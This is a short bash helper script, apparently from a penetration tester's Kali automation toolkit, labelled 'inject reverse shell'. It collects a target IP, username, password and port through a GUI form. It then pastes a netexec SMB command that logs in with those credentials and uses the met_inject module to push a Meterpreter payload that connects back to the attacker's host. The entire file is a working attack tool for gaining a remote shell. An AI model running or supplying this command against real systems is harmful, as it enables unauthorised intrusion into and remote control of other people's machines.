#!/bin/bash

: '
inject reverse shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "IP" "Username" "Password" "Port"

IP=${form_data["IP"]}
USERNAME=${form_data["Username"]}
PASSWORD=${form_data["Password"]}
PORT=${form_data["Port"]}

paste_command "netexec smb ${IP} -u '${USERNAME}' -p '${PASSWORD}' --local-auth -M met_inject -o SRVHOST=${KALI_IP} SRVPORT=${PORT}"
 